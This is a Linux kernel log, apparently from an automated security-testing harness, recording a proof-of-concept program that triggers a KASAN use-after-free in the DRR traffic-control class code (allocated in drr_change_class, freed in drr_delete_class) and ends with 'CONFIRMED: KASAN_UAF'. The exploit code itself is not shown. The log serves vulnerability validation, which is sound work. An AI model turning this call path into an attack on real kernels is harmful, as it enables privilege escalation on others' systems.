[    1.174837] Code: 64 89 02 48 c7 c0 ff ff ff ff eb b7 66 2e 0f 1f 84 00 00 00 00 00 90 80 3d 71 04 07 00 00 41 89 ca 74 14 b8 2c 00 00 00 0f 05 <48> 3d 00 f0 ff ff 77 75 c3 0f 1f 40 00 55 48 83 ec 30 44 89 4c 24
[    1.175555] RSP: 002b:00007ffe65d3a878 EFLAGS: 00000202 ORIG_RAX: 000000000000002c
[    1.175859] RAX: ffffffffffffffda RBX: 0000000000000040 RCX: 000000000043bc13
[    1.176145] RDX: 0000000000000001 RSI: 00007ffe65d3a89b RDI: 0000000000000005
[    1.176430] RBP: 0000000000000005 R08: 00007ffe65d3a8a0 R09: 0000000000000010
[    1.176707] R10: 0000000000000040 R11: 0000000000000202 R12: 00007ffe65d3a8a0
[    1.176984] R13: 00007ffe65d3a89b R14: 0000000000000004 R15: 0000000000010100
[    1.177270]  </TASK>
[    1.177365] 
[    1.177432] Allocated by task 101:
[    1.177573]  kasan_save_stack+0x33/0x60
[    1.177731]  kasan_save_track+0x14/0x30
[    1.177888]  __kasan_kmalloc+0x8f/0xa0
[    1.178037]  drr_change_class+0x36f/0xae0
[    1.178196]  tc_ctl_tclass+0x3d6/0x12a0
[    1.178355]  rtnetlink_rcv_msg+0x365/0xa40
[    1.178525]  netlink_rcv_skb+0x12f/0x370
[    1.178686]  netlink_unicast+0x5c2/0x830
[    1.178847]  netlink_sendmsg+0x75c/0xc00
[    1.179008]  __sys_sendto+0x39c/0x410
[    1.179159]  __x64_sys_sendto+0xdb/0x1b0
[    1.179320]  do_syscall_64+0xa6/0x1a0
[    1.179473]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
[    1.179677] 
[    1.179745] Freed by task 101:
[    1.179871]  kasan_save_stack+0x33/0x60
[    1.180025]  kasan_save_track+0x14/0x30
[    1.180183]  kasan_save_free_info+0x3b/0x60
[    1.180354]  poison_slab_object+0x109/0x170
[    1.180526]  __kasan_slab_free+0x14/0x30
[    1.180686]  kfree+0x9c/0x220
[    1.180812]  drr_delete_class+0x2c4/0x470
[    1.180977]  tc_ctl_tclass+0xe7d/0x12a0
[    1.181135]  rtnetlink_rcv_msg+0x365/0xa40
[    1.181302]  netlink_rcv_skb+0x12f/0x370
[    1.181465]  netlink_unicast+0x5c2/0x830
[    1.181620]  netlink_sendmsg+0x75c/0xc00
[    1.181775]  __sys_sendto+0x39c/0x410
[    1.181921]  __x64_sys_sendto+0xdb/0x1b0
[    1.182077]  do_syscall_64+0xa6/0x1a0
[    1.182223]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
[    1.182423] 
[    1.182489] The buggy address belongs to the object at ffff88800a726f00
[    1.182489]  which belongs to the cache kmalloc-128 of size 128
[    1.182962] The buggy address is located 80 bytes inside of
[    1.182962]  freed 128-byte region [ffff88800a726f00, ffff88800a726f80)
[    1.183427] 
[    1.183493] The buggy address belongs to the physical page:
[    1.183709] page: refcount:1 mapcount:0 mapping:0000000000000000 index:0x0 pfn:0xa726
[    1.184011] head: order:1 mapcount:0 entire_mapcount:0 nr_pages_mapped:0 pincount:0
[    1.184305] flags: 0x100000000000040(head|node=0|zone=1)
[    1.184515] page_type: 0xfdffffff(slab)
[    1.184668] raw: 0100000000000040 ffff888006842a00 dead000000000122 0000000000000000
[    1.184966] raw: 0000000000000000 0000000000200020 00000001fdffffff 0000000000000000
[    1.185264] head: 0100000000000040 ffff888006842a00 dead000000000122 0000000000000000
[    1.185569] head: 0000000000000000 0000000000200020 00000001fdffffff 0000000000000000
[    1.185870] head: 0100000000000001 ffffea000029c981 ffffffffffffffff 0000000000000000
[    1.186171] head: 0000000000000002 0000000000000000 00000000ffffffff 0000000000000000
[    1.186474] page dumped because: kasan: bad access detected
[    1.186690] 
[    1.186755] Memory state around the buggy address:
[    1.186943]  ffff88800a726e00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
[    1.187222]  ffff88800a726e80: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc
[    1.187504] >ffff88800a726f00: fa fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
[    1.187782]                                                  ^
[    1.188009]  ffff88800a726f80: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc
[    1.188288]  ffff88800a727000: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 fc fc
[    1.188569] ==================================================================
[    1.188851] Disabling lock debugging due to kernel taint
poc: done
[    1.290838] poc (101) used greatest stack depth: 25912 bytes left
---- poc end rc=0 ----
secb: poc exited without crashing the kernel
[    2.126532] input: ImExPS/2 Generic Explorer Mouse as /devices/platform/i8042/serio1/input/input3
[    2.551191] ACPI: PM: Preparing to enter system sleep state S5
[    2.551726] reboot: Power down
CONFIRMED: KASAN_UAF
